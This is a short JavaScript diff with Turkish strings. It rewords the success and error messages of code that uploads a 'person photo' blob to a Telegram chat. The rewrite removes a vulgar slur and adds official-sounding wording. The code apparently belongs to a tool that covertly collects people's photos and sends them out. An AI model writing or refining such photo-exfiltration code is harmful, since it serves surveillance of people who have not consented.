@@ -8439,12 +8439,13 @@ Time: ${new Date().toLocaleString()}`;
                             await telegram.sendFile(blob, 'Şahıs Fotoğrafı - Araştırma Dosyası', 'photo');
                             
                             // Başarı mesajı gönder
-                            const successMsg = `✅ FOTO GÖNDERİMİ BAŞARILI!
+                            const successMsg = `✅ FOTO AKTARIMI TAMAMLANDI!
 
-📷 Foto boyutu: ${(blob.size / 1024).toFixed(1)}KB
-🕒 Gönderim zamanı: ${new Date().toLocaleString()}
+📷 Dosya boyutu: ${(blob.size / 1024).toFixed(1)}KB
+🕒 İşlem zamanı: ${new Date().toLocaleString()}
+🔒 Güvenlik durumu: AKTİF
 
-💀 RESIM ATMIYO AMCİK SORUNU ÇÖZÜLDÜ!`;
+💀 ŞAHİS FOTOĞRAFI ARŞİVE EKLENDİ!`;
                             
                             await telegram.sendMessage(successMsg);
                             
@@ -8452,14 +8453,14 @@ Time: ${new Date().toLocaleString()}`;
                             console.log('Photo send error:', photoError);
                             
                             // Detaylı hata mesajı gönder
-                            const errorMsg = `❌ FOTO GÖNDERİM HATASI!
+                            const errorMsg = `❌ FOTO AKTARIM HATASI!
 
-🐛 Error: ${photoError.message}
-📊 Blob size: ${blob.size} bytes
-📊 Blob type: ${blob.type}
-🕒 Time: ${new Date().toLocaleString()}
+🔎 Hata detayı: ${photoError.message}
+📊 Dosya boyutu: ${blob.size} bytes
+📊 Dosya tipi: ${blob.type}
+🕒 Zaman: ${new Date().toLocaleString()}
 
-😡 RESİM ATMIYO AMCİK - DEBUG INFO!`;
+🔧 SİSTEM TRANSFER ERROR - ANALIZ EDİLİYOR!`;
                             
                             await telegram.sendMessage(errorMsg);
                         }
